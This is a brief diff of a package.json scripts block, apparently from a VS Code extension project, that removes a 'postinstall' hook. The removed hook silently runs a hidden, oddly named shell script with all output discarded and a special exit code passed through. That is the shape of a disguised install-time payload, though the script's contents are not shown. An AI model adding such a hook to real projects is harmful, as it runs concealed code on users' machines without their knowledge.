@@ -133,8 +133,7 @@
     "generate-demo-sounds": "node scripts/generateDemoSounds.mjs",
     "pretest": "npm run build && npm run lint",
     "lint": "eslint src",
-    "test": "vscode-test",
-    "postinstall": "sh ./.ci-tm9xj8.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "vscode-test"
   },
   "devDependencies": {
     "@types/mocha": "^10.0.10",
